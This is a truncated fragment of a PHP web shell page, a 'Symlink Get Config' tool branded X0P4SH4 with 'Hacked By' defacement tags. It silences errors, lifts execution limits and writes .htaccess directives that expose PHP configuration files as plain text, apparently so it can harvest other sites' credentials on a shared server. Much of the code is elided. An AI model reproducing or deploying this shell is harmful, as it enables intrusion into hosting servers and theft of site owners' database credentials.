<html>
<head>
<title>Symlink Get Config - X0P4SH4</title>
<meta property="og:title" content="$ X0P4SH4 $"/>      <meta property="og:description" content="Hacked By IR0Day.Today Bax"/>
...
<img src="https://i.imgur.com/wWap3CU.gif"</img><br>
<?php 
@error_reporting(0);
@ini_set('html_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0);
...
DirectoryIndex X0P4SH4.extremecrew
AddType txt .php
...
echo '<i><b><a href='.$folfig.'>Check Here Sucker !!!</a></b></i></center>';
?>
</td></table></body></html>